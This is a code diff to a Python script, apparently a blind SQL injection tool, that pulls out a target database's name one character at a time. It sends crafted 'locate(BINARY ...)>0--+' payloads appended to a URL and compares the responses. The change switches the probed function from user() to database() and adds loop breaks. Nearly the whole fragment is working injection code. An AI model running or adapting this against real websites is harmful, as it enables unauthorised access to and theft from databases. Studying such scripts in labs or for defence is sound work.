@@ -51,14 +51,16 @@ def database_Name(URL,DBLen):
             if different_Str in response_dbName_left_text:
                 database_Name += p
                 print("No.%s is: %s"%(i,database_Name))
+                break
             else:
                 # 从右往左枚举
-                payload_dbName_right = URL + "\' and locate(BINARY \'" + p + database_Name + "\', user())>0--+"
+                payload_dbName_right = URL + "\' and locate(BINARY \'" + p + database_Name + "\', database())>0--+"
                 print (payload_dbName_right)
                 response_dbName_right_text = requests.get(payload_dbName_right).text
                 if different_Str in response_dbName_right_text:
                     database_Name = p + database_Name
                     print("No.%s is: %s"%(i,database_Name))
+                    break
     
     return database_Name
 
